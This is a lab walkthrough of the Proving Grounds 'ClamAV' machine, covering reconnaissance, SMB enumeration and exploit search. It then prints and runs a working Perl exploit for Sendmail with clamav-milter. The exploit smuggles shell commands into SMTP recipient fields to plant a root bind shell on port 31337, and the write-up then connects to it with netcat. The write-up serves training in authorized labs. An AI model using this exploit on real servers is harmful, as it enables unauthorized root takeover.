---
description: 'Date: 08/20/22'
---

# "ClamAV" (Easy)

Walkthrough by: Jacob Swinsinski

“ClamAV” from Offensive Security’s Proving Ground Practice — “Easy” Difficulty

Target: 192.168.238.42

### Recon:

```
nmapAutomator.sh -H 192.168.238.42 -t All

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp  open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.49.238], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp  open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
|_http-title: Ph33r
| http-methods: 
|_  Potentially risky methods: TRACE
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp open  smux        Linux SNMP multiplexer
445/tcp open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 5h59m59s, deviation: 2h49m43s, median: 3h59m58s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\\x00
|_  System time: 2022-08-20T16:08:13-04:00
```

### Visual of web server on port 80:

* We get a blank website with binary text on it.
* The title of the site is Ph33r.

Binary → ASCII:

```
# Binary
01101001 01100110 01111001 01101111 01110101 01100100 01101111 01101110 01110100 01110000 01110111 01101110 01101101 01100101 01110101 01110010 01100001 01101110 00110000 0011 0000 01100010

# ASCII
ifyoudontpwnmeuran00b
```

Site I used to translate:

[Binary to Text Translator](https://www.rapidtables.com/convert/number/binary-to-ascii.html)

* Change Character encoding to ASCII.

Page Source:

* I went through the source code of the page — nothing interesting.

### Wappalyzer Technology Results:

* Apache 1.3.33
* Debian

### Directory Bruteforce (Dirsearch):

```
dirsearch -u <http://192.168.238.42/>

Target: <http://192.168.238.42/>

[12:19:12] Starting: 
[12:19:18] 403 -  280B  - /.ht_wsr.txt                                     
[12:19:18] 403 -  283B  - /.htaccess.bak1                                  
[12:19:18] 403 -  283B  - /.htaccess.orig
[12:19:18] 403 -  283B  - /.htaccess.save
[12:19:18] 403 -  285B  - /.htaccess.sample
[12:19:18] 403 -  284B  - /.htaccess_extra
[12:19:18] 403 -  281B  - /.htaccess_sc
[12:19:18] 403 -  283B  - /.htaccess_orig
[12:19:19] 403 -  281B  - /.htaccessBAK
[12:19:19] 403 -  281B  - /.htaccessOLD
[12:19:19] 403 -  282B  - /.htaccessOLD2
[12:19:19] 403 -  273B  - /.htm                                            
[12:19:19] 403 -  274B  - /.html
[12:19:19] 403 -  283B  - /.htpasswd_test
[12:19:19] 403 -  279B  - /.htpasswds
[12:19:19] 403 -  280B  - /.httr-oauth
[12:19:38] 403 -  277B  - /cgi-bin/                                         
[12:19:41] 403 -  272B  - /doc                                              
[12:19:41] 403 -  273B  - /doc/
[12:19:41] 403 -  288B  - /doc/html/index.html                              
[12:19:41] 403 -  288B  - /doc/en/changes.html                              
[12:19:41] 403 -  277B  - /doc/api/
[12:19:41] 403 -  287B  - /doc/stable.version                               
[12:19:46] 200 -  289B  - /index                                            
[12:19:46] 200 -  289B  - /index.html
```

### While waiting for my full port scan, I was messing with CrackMapExec:

1.  Enumerate Null Sessions:

    ```
    crackmapexec smb 192.168.238.42 -u '' -p ''

    SMB         192.168.238.42  445    NONE             [*] Unix (name:) (domain:) (signing:False) (SMBv1:True)
    SMB         192.168.238.42  445    NONE             [-] \\: STATUS_OBJECT_NAME_NOT_FOUND
    ```
2.  Attempt similar behavior with smbclient:

    ```
    smbclient -N -U "" -L \\\\192.168.238.42

    smbclient -N -U "" -L \\\\192.168.238.42                  Sat 20 Aug 2022 12:43:58 PM EDT

            Sharename       Type      Comment
            ---------       ----      -------
            print$          Disk      Printer Drivers
            IPC$            IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
            ADMIN$          IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
    Reconnecting with SMB1 for workgroup listing.

            Server               Comment
            ---------            -------
            0XBABE               0xbabe server (Samba 3.0.14a-Debian) brave pig

            Workgroup            Master
            ---------            -------
            WORKGROUP            0XBABE
    ```

### Exploit Search:

Searchsploit:

Apache:

```
searchsploit apache 1.3.33

Apache 1.3.34/1.3.33 (Ubuntu / Debian) - CGI TTY Privilege Escalation             | linux/local/3384.c
```

* This is for privilege escalation.
* Could be useful later.

ClamAV:

```
searchsploit clamav

Clam Anti-Virus ClamAV 0.88.x - UPX Compressed PE File Heap Buffer O | linux/dos/28348.txt
ClamAV / UnRAR - .RAR Handling Remote Null Pointer Dereference       | linux/remote/30291.txt
ClamAV 0.91.2 - libclamav MEW PE Buffer Overflow                     | linux/remote/4862.py
ClamAV < 0.102.0 - 'bytecode_vm' Code Execution                      | linux/local/47687.py
ClamAV < 0.94.2 - JPEG Parsing Recursive Stack Overflow (PoC)        | multiple/dos/7330.c
ClamAV Daemon 0.65 - UUEncoded Message Denial of Service             | linux/dos/23667.txt
ClamAV Milter - Blackhole-Mode Remote Code Execution (Metasploit)    | linux/remote/16924.rb
ClamAV Milter 0.92.2 - Blackhole-Mode (Sendmail) Code Execution (Met | multiple/remote/9913.rb
Sendmail with clamav-milter < 0.91.2 - Remote Command Execution      | multiple/remote/4761.pl
```

* I like the highlighted one as it makes the most sense since SMTP on port 25 is open.

### [4761.pl](http://4761.pl):

Location:

/usr/share/exploitdb/exploits/multiple/remote/4761.pl

```
### black-hole.pl
### Sendmail w/ clamav-milter Remote Root Exploit
### Copyright (c) 2007 Eliteboy
########################################################
use IO::Socket;

print "Sendmail w/ clamav-milter Remote Root Exploit\\n";
print "Copyright (C) 2007 Eliteboy\\n";

if ($#ARGV != 0) {print "Give me a host to connect.\\n";exit;}

print "Attacking $ARGV[0]...\\n";

$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                              PeerPort => '25',
                              Proto    => 'tcp');

print $sock "ehlo you\\r\\n";
print $sock "mail from: <>\\r\\n";
print $sock "rcpt to: <nobody+\\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\\"@localhost>\\r\\n";
print $sock "rcpt to: <nobody+\\"|/etc/init.d/inetd restart\\"@localhost>\\r\\n";
print $sock "data\\r\\n.\\r\\nquit\\r\\n";

while (<$sock>) {
        print;
}
```

* We see that this is a perl script, so we run it with perl:

```python
perl 4761.pl

Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.238.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Wed, 24 Aug 2022 00:40:40 -0400; (No UCE/UBE) logging access from: [192.168.49.238](FAIL)-[192.168.49.238]
250-localhost.localdomain Hello [192.168.49.238], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 27O4eee3004091 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
```

* This will open a new port (31337)
* Upon attempting a banner grab, you can obtain a unstable reverse shell.

Unauthenticated Root Access:

```
nc -nv 192.168.238.42 31337

(UNKNOWN) [192.168.238.42] 31337 (?) open

whoami
root

cat /root/proof.txt
<hash_here>
```
